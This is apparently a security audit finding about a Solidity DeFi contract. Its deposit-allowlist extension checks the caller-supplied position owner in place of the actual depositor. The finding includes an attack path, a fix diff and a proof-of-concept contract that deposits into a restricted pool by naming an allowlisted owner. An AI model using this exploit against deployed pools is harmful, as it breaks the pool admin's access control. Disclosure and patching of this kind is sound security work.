### Title
`DepositAllowlistExtension` gates on position `owner` instead of `sender`, allowing any address to bypass the deposit allowlist — (`metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

---

### Summary

`DepositAllowlistExtension.beforeAddLiquidity` silently drops the `sender` parameter (the actual caller of `addLiquidity`) and instead gates on `owner` (the position owner, a freely caller-supplied argument). Because `owner` is not the depositor, any unauthorized address can bypass the allowlist by naming an already-allowlisted address as `owner`.

---

### Finding Description

The pool passes `msg.sender` as `sender` and the caller-supplied `owner` as `owner` to every `beforeAddLiquidity` hook: [1](#0-0) 

Inside `DepositAllowlistExtension`, the first parameter (`sender`) is unnamed and completely ignored. The allowlist check uses `owner` instead: [2](#0-1) 

The sister extension `SwapAllowlistExtension` correctly checks `sender` (the actual caller): [3](#0-2) 

**Attack path:**

1. Pool is deployed with `DepositAllowlistExtension`; only address `A` is allowlisted via `setAllowedToDeposit`.
2. Unauthorized address `X` (not on the allowlist) calls `pool.addLiquidity(A, salt, deltas, callbackData, extensionData)` directly.
3. The extension evaluates `allowedDepositor[pool][A]` → `true` → hook passes.
4. The pool calls back to `X` (`msg.sender`) for token payment via `metricOmmModifyLiquidityCallback`.
5. `X` pays tokens; a position is minted under owner `A`.

The actual depositor `X` is never checked. The allowlist is fully bypassed.

**Root cause — wrong field gated:**

| Hook | Field checked | Correct? |
|---|---|---|
| `SwapAllowlistExtension.beforeSwap` | `sender` (actual caller) | ✅ |
| `DepositAllowlistExtension.beforeAddLiquidity` | `owner` (caller-supplied arg) | ❌ |

---

### Impact Explanation

The `DepositAllowlistExtension` is the sole mechanism by which a pool admin restricts who may add liquidity. Checking `owner` instead of `sender` renders the allowlist entirely ineffective: any address can deposit into a restricted pool by supplying an allowlisted address as `owner`. The pool admin's access-control boundary is broken by an unprivileged path, satisfying the "Admin-boundary break" impact gate. Additionally, unauthorized liquidity deposits alter the pool's bin balances and LP share accounting, which can affect swap prices and LP returns for existing participants.

---

### Likelihood Explanation

Exploitation requires only a single direct call to `pool.addLiquidity` with any known allowlisted address as `owner`. No special privileges, flash loans, or complex setup are needed. Allowlisted addresses are discoverable on-chain from past `AllowedToDepositSet` events. Likelihood is high.

---

### Recommendation

Name the first parameter and check `sender` (the actual depositor), mirroring `SwapAllowlistExtension`:

```diff
- function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
+ function beforeAddLiquidity(address sender, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
-   if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
+   if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
``` [2](#0-1) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmSwapCallback} from "@metric-core/interfaces/callbacks/IMetricOmmSwapCallback.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Demonstrates that an address NOT on the DepositAllowlistExtension allowlist
///         can deposit into a restricted pool by supplying an allowlisted address as `owner`.
contract BypassDepositor {
    address immutable pool;
    address immutable token0;
    address immutable token1;

    constructor(address pool_, address token0_, address token1_) {
        pool = pool_;
        token0 = token0_;
        token1 = token1_;
    }

    /// @param allowlistedOwner Any address that the pool admin has allowlisted.
    function attack(address allowlistedOwner, LiquidityDelta calldata deltas) external {
        // This contract (msg.sender) is NOT on the allowlist.
        // The extension checks allowedDepositor[pool][allowlistedOwner] → true → passes.
        IMetricOmmPoolActions(pool).addLiquidity(
            allowlistedOwner, // owner: allowlisted → extension check passes
            0,                // salt
            deltas,
            "",               // callbackData
            ""                // extensionData
        );
        // Deposit succeeded; position is owned by allowlistedOwner, funded by this contract.
    }

    function metricOmmModifyLiquidityCallback(
        uint256 amount0Delta,
        uint256 amount1Delta,
        bytes calldata
    ) external {
        require(msg.sender == pool);
        if (amount0Delta > 0) IERC20(token0).transfer(pool, amount0Delta);
        if (amount1Delta > 0) IERC20(token1).transfer(pool, amount1Delta);
    }
}
```

### Citations

**File:** metric-core/contracts/ExtensionCalling.sol (L88-99)
```text
  function _beforeAddLiquidity(
    address sender,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_ADD_LIQUIDITY_ORDER,
      abi.encodeCall(IMetricOmmExtensions.beforeAddLiquidity, (sender, owner, salt, deltas, extensionData))
    );
  }
```

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L32-42)
```text
  function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```
